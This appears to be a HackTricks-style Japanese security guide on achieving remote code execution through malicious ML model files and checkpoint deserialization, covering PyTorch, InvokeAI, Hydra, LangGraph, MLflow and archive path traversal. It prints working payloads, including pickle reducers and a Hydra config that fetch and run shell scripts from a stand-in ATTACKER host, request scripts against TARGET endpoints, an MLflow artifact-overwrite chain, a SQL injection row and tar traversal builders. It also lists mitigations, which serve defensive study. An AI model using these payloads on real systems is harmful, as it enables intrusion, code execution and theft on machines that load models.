# Models RCE

{{#include ../banners/hacktricks-training.md}}

## モデルの読み込みによるRCE

Machine Learningモデルは通常、ONNX、TensorFlow、PyTorchなど、さまざまな形式で共有されます。これらのモデルは、開発者のマシンや本番システムに読み込んで使用できます。通常、モデルに悪意のあるコードが含まれることはありませんが、意図された機能として、あるいはモデル読み込みライブラリの脆弱性によって、モデルからシステム上で任意のコードを実行できる場合があります。

以下の表に、このカテゴリの代表的な脆弱性を示します。

| **Framework / Tool**        | **脆弱性（該当する場合はCVE）**                                                    | **RCEの経路**                                                                                                                           | **参考資料**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`の安全でないデシリアライゼーション* **(CVE-2025-32434)**                                                              | モデルのcheckpoint内の悪意あるpickleによりコードが実行される（`weights_only`の保護を回避）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 悪意あるモデルのダウンロードによってコードが実行される。management APIでのJavaデシリアライゼーションによるRCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load`による安全でないcheckpointのデシリアライゼーション **(CVE-2025-23298)**                                           | 信頼できないcheckpointが`load_model_trainer_states_from_checkpoint`中にpickle reducerを呼び出し、ML workerでコードを実行する            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 安全でないMessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ユーザーが制御する`filter`キーでSQL/JSON-path構文を注入し、`UNION SELECT`で偽のcheckpoint行を生成する。その後、`msgpack`デシリアライゼーションが攻撃者の選んだPythonコードをimportして呼び出す | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678**（安全でないYAML） <br> **CVE-2024-3660**（Keras Lambda）                                                      | YAMLからモデルを読み込む際に`yaml.unsafe_load`を使用する（コード実行） <br> **Lambda** layerを含むモデルを読み込むと任意のPythonコードが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559**（TFLiteのparsing）                                                                                          | 細工された`.tflite`モデルがinteger overflowを引き起こし、heap corruptionにつながる（RCEの可能性）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092**（joblib/pickle）                                                                                           | `joblib.load`でモデルを読み込むと、攻撃者の`__reduce__` payloadを含むpickleが実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446**（安全でない`np.load`）*異論あり*                                                                              | `numpy.load`はデフォルトでpickle化されたobject arrayを許可していたため、悪意ある`.npy/.npz`でコードが実行される                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882**（dir traversal） <br> **CVE-2024-5187**（tar traversal）                                                    | ONNXモデルのexternal-weights pathがディレクトリ外を参照できる（任意ファイルの読み取り） <br> 悪意あるONNX model tarが任意のファイルを上書きできる（RCEにつながる） | |
| ONNX Runtime (design risk)  | *(CVEなし)* ONNX custom ops / control flow                                                                                    | custom operatorを含むモデルは攻撃者のnative codeを読み込む必要がある。複雑なモデルグラフがロジックを悪用し、意図しない計算を実行する   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036**（path traversal）                                                                                          | `--model-control`を有効にしてmodel-load APIを使用すると、相対path traversalでファイルを書き込める（例：`.bashrc`を上書きしてRCE）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668**（複数のheap overflow）                                                                         | 不正なGGUF model fileがparserでheap buffer overflowを引き起こし、被害者のシステム上で任意のコードを実行できる                     | |
| **Keras (older formats)**   | *(新たなCVEなし)* Legacy Keras H5 model                                                                                         | Lambda layerを含む悪意あるHDF5（`.h5`）modelは、読み込み時に引き続きコードを実行する（Kerasのsafe_modeは旧形式を対象としない ― 「downgrade attack」） | |
| **Others** (general)        | *設計上の欠陥* – Pickle serialization                                                                                         | 多くのMLツール（例：pickleベースのmodel形式、Pythonの`pickle.load`）は、対策がなければmodel fileに埋め込まれた任意のコードを実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 信頼できないmetadataを`hydra.utils.instantiate()`に渡す **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻撃者が制御するmodel metadata/configで`_target_`を任意のcallable（例：`builtins.exec`）に設定すると、「安全な」形式（`.safetensors`、`.nemo`、repoの`config.json`）であっても、読み込み時に実行される | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security)で使用されるもののように、`weights_only=True`を指定せずに読み込むと、システム上で任意のコードを実行できるPython pickleベースのモデルもあります。そのため、上の表に記載されていなくても、pickleベースのモデルはこの種の攻撃に特に弱い可能性があります。

### Hydra metadata → RCE（safetensorsでも可能）

`hydra.utils.instantiate()`は、設定/metadataオブジェクト内のドット区切りの`_target_`をimportして呼び出します。Hugging Face Transformersなどのライブラリが**信頼できないmodel metadata**を`instantiate()`に渡す場合、攻撃者はモデルの読み込み時にただちに実行されるcallableと引数を指定できます（pickleは不要です）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

payloadの例（`.nemo`の`model_config.yaml`、repoの`config.json`、または`.safetensors`内の`__metadata__`で動作）:

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

要点:
- NeMo の `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders では、model initialization の前にトリガーされる。
- Hydra の string block-list は、代替の import path（例: `enum.bltns.eval`）や、アプリケーションが解決する名前（例: `nemo.core.classes.common.os.system` → `posix`）によって回避できる。<sup>[[14]](#references)</sup>
- FlexTok は `ast.literal_eval` で文字列化された metadata も解析するため、Hydra 呼び出しの前に DoS（CPU/memory の急増）が発生する可能性がある。

### 🆕  `torch.load` による InvokeAI RCE (CVE-2024-12029)

`InvokeAI` は、Stable-Diffusion 用の人気のオープンソース web interface です。バージョン **5.3.1 – 5.4.2** では、ユーザーが任意の URL からモデルをダウンロードしてロードできる REST endpoint `/api/v2/models/install` が公開されています。<sup>[[1]](#references)</sup>

この endpoint は最終的に、内部で次の関数を呼び出します:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

指定されたファイルが **PyTorch checkpoint (`*.ckpt`)** の場合、`torch.load` は **pickle deserialization** を実行します。内容はユーザーが制御する URL から直接取得されるため、攻撃者は checkpoint 内にカスタム `__reduce__` メソッドを持つ悪意あるオブジェクトを埋め込めます。このメソッドは **deserialization 中に** 実行され、InvokeAI サーバー上で **remote code execution (RCE)** を引き起こします。

この脆弱性には **CVE-2024-12029** が割り当てられています（CVSS 9.8、EPSS 61.17 %）。

#### Exploitation の手順

1. 悪意ある checkpoint を作成します。

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` を自分が管理する HTTP server（例: `http://ATTACKER/payload.ckpt`）でホストします。
3. 脆弱な endpoint をトリガーします（認証は不要）:

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し、`os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストでコード実行を取得します。

すぐに使える exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連の流れを自動化します。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan flag のデフォルトは **false**）
•  攻撃者が `/api/v2/models/install` にアクセスできる
•  プロセスに shell コマンドを実行する権限がある

#### 緩和策

* **InvokeAI ≥ 5.4.3** にアップグレードする – patch によりデフォルトで `scan=True` が設定され、deserialization 前に malware scanning が実行されます。<sup>[[2]](#references)</sup>
* checkpoint をプログラムから読み込む場合は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用します。
* model source として allow-list / signatures を適用し、least-privilege で service を実行します。

> ⚠️ 信頼できない source から deserialize する場合、Python pickle ベースの形式（多くの `.pt`、`.pkl`、`.ckpt`、`.pth` ファイルを含む）は**すべて**本質的に安全ではないことを忘れないでください。

---

古いバージョンの InvokeAI を reverse proxy の背後で稼働させ続ける必要がある場合の、その場しのぎの緩和策の例:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec の unsafe `torch.load` による RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec (Merlin の一部) には、ユーザーが指定したパスに対して `torch.load()` を直接呼び出す unsafe な checkpoint loader がありました。`torch.load` は Python の `pickle` に依存しているため、攻撃者が制御する checkpoint は、デシリアライズ中に reducer を介して任意のコードを実行できます。<sup>[[5]](#references)</sup>

脆弱なパス (修正前): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

RCE につながる理由: Python の pickle では、オブジェクトに callable と引数を返す reducer (`__reduce__`/`__setstate__`) を定義できます。unpickling 中にその callable が実行されます。このようなオブジェクトが checkpoint に含まれていると、重みが使われる前に実行されます。

最小限の悪意ある checkpoint の例:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Delivery vectors と blast radius:
- repos、buckets、artifact registries 経由で共有される Trojanized checkpoints/models
- checkpoints を自動ロードする自動 resume/deploy pipelines
- training/inference workers 内で実行され、多くの場合 elevated privileges（例: containers 内の root）で動作する

修正: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）では、直接的な `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された、制限付きの allow-listed deserializer に置き換えました。新しい loader は型とフィールドを検証し、load 中に任意の callable が呼び出されるのを防ぎます。<sup>[[7]](#references)</sup>

PyTorch checkpoints に固有の防御策:
- 信頼できないデータを unpickle しないでください。可能な場合は、[Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX など、実行可能コードを含まない形式を使用してください。
- PyTorch serialization を使う必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を指定するか、Transformers4Rec の patch と同様の、allow-listed なカスタム unpickler を使用してください。<sup>[[4]](#references)</sup>
- model の provenance/signatures を強制し、deserialization を sandbox 化してください（seccomp/AppArmor、non-root user、制限された FS、ネットワークへの egress なし）。
- checkpoint の load 時に、ML services から予期しない child processes が起動していないか監視してください。また、`torch.load()`/`pickle` の使用状況を追跡してください。

POC と脆弱性/patch の参照:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- patch 適用前の脆弱な loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 悪意のある checkpoint の POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- patch 適用後の loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 例 – 悪意のある PyTorch model の作成

- model を作成する:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- モデルをロードする:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Tencent FaceDetection-DSFD resnet のデシリアライズ (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザーが制御するデータをデシリアライズする `resnet` endpoint を公開しています。ZDI の確認によると、リモートの攻撃者は被害者に悪意のあるページやファイルを読み込ませ、細工したシリアライズ済み blob をその endpoint に送信させることで、`root` としてデシリアライズを実行し、システムを完全に侵害できます。

この exploit の流れは、一般的な pickle の悪用と同様です。

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

デシリアライゼーション中に到達可能な gadget（コンストラクター、`__setstate__`、framework callback など）は、HTTP、WebSocket、監視対象ディレクトリに置かれたファイルのいずれが transport であっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この攻撃チェーンが興味深いのは、攻撃者が**悪意のある model file をアップロードする必要がない**点です。代わりに、アプリケーションが**AI-agent の永続化 API**（`get_state_history(..., filter=...)`）を公開しており、ユーザー入力が checkpointer の query builder に到達します。

#### 1. metadata filter における構造的 SQLi

脆弱な SQLite のパターンは次のようなものでした:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

値は後でバインドされますが、`query_key` は**JSON path string**に連結されるため、辞書キー内の `'` によって `'$.{query_key}'` を抜け出し、SQL を注入できます。同じ教訓は**JSON paths、identifiers、operators、`LIMIT`、TTL fields**にも当てはまります。プレースホルダーが保護するのは値だけであり、クエリ構文の構造部分は保護されません。

#### 2. `UNION SELECT` はデータ窃取だけでなく、下流の sink も狙える

このクエリは `type` とシリアライズされた `checkpoint` bytes を返し、これらは後で次のように処理されます。

```python
self.serde.loads_typed((type, checkpoint))
```

つまり、`WHERE`句のSQLiによって**偽の結果行**を注入できる：

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

後続のコードが選択された列を解析、デシリアライズ、書き込み、または実行する場合は、それらの列を対応する sink にマッピングします。このケースでは、偽の行によって SQLi が**攻撃者制御のデシリアライズ**に変わります。

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

LangGraph の `msgpack` パスでは、ネストされたタプルを unpack して次を実行するカスタム extension hook が使われていました。

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

したがって、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack extension object は、`os` をインポートし、`system` を解決してコマンドを実行します。AI framework をレビューする際は、動的インポート、reflection、任意の callable dispatch を行う **custom MessagePack/JSON/pickle revivers** を調べてください。

#### 4. agent framework の実践的な監査パターン

ユーザーが制御する入力が次のいずれかに到達するかを確認してください。
- state history / memory / replay / checkpoint の一覧表示 API
- SQL または Redis query の断片を生成する構造化 filter builder
- custom deserializer（`pickle`、`msgpack`、`json` object hook、YAML constructor）
- persistence layer から返された行を信頼する recovery path

この特定の chain は、信頼できないユーザーが `filter` を制御できる場合の、**SQLite** または **Redis** の checkpointer を使用する self-hosted LangGraph deployment に影響しました。開示で示された修正済みバージョンは `langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、`langgraph-checkpoint 4.0.1+` です。<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact の上書きによる pickle RCE

`PythonModel` から作成された MLflow PyFunc は、シリアライズされた object を `python_model.pkl` として保存できます。model metadata では `mlflow.pyfunc.model` が loader として指定され、MLflow の実装は保存された Python model にこのファイル名を使用します。そのため、artifact store への書き込み権限があると、後で model を読み込む別の application でコード実行につながる可能性があります。<sup>[[17]](#references)[[18]](#references)</sup>

有効な chain は **artifact の書き込み権限 → pickle の置き換え → inference consumer に再読み込みさせる** です。`mlflow-artifacts:/...` の proxied root を使用する experiment では、experiment、run、model の artifact path を列挙してください。tracking server は `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` で `GET` と `PUT` を公開します。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

最小限のreducerは、consumerがartifactをunpickleするとすぐにコマンドを実行できます。`MLmodel`で宣言されているPythonバージョンを使ってpayloadを生成すれば、互換性の問題を回避できます。<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

既存のモデルを**読み込む**操作（予測、スコアリング、デプロイなど）を実行します。先に再トレーニングしないでください。トレーニングによって悪意のある artifact が新しいモデルに置き換わる可能性があります。アプリケーションエラーが発生しても、悪用が否定されたことにはなりません。reducer は使用可能なモデルではなく、コマンドの整数の終了ステータスを返すためです。まず ICMP や HTTP callback など、観測可能な副作用を使い、その後で最終的な payload に置き換えます。<sup>[[20]](#references)</sup>

評価では、run の作成権限と、別の run に属する artifact の上書き権限を区別してください。認証と run ごとの更新権限を確認し、`python_model.pkl` への予期しない変更を調べ、モデルの由来と完全性を実行境界の一部として扱ってください。現在の MLflow のコードでは `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` の設定もサポートされており、cloudpickle データを読み込む代わりに models-from-code artifact を使用することが推奨されています。<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### 露出した model server と ML インフラストラクチャ

悪意のあるモデルの読み込みだけが、ML インフラストラクチャ上でコードを実行する方法ではありません。ジョブ送信 API、コード検証エンドポイント、自社ホスト型 AI サービスの model registry pull によって、モデルファイルを使わずにコード実行に至る可能性があります。[露出した自社ホスト型 AI サービス](AI-Exposed-Self-Hosted-AI-Services.md)を参照してください。

## モデルから Path Traversal へ

[**このブログ記事**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)で解説されているように、さまざまな AI framework で使われるモデル形式の多くは、通常 `.zip` の archive をベースにしています。そのため、これらの形式を悪用して path traversal 攻撃を行い、モデルが読み込まれるシステムから任意のファイルを読み取れる可能性があります。<sup>[[16]](#references)</sup>

たとえば、次のコードを使うと、読み込み時に `/tmp` ディレクトリ内にファイルを作成するモデルを作成できます。

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

または、以下のコードを使うと、ロード時に`/tmp`ディレクトリへのsymlinkを作成するモデルを作成できます：

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 詳細解説: Keras .keras のデシリアライズと gadget hunting

.keras の内部構造、Lambda-layer RCE、3.8 以下の任意インポート問題、修正後の allowlist 内での gadget 探索に焦点を当てたガイドについては、以下を参照してください。


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI の信頼できないデータのデシリアライズ"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI のパッチコミット 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit モジュールのドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load のセキュリティに関する考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 NVIDIA Merlin での Remote Code Execution の実現](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI アドバイザリ: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec のパッチコミット b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [パッチ適用前の脆弱なローダー (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [悪意のある checkpoint の PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [パッチ適用後のローダー (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 最新の AI/ML 形式とライブラリを利用した Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate のドキュメント](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra の block-list コミット (RCE に関する警告)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi から RCE へ: LangGraph の Checkpointer の悪用](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip のバグを高価値な AI/ML バウンティへと活用する](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk アドバイザリと PyFunc の概念実証 – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow ソース – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact のダウンロードおよびアップロード endpoint](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
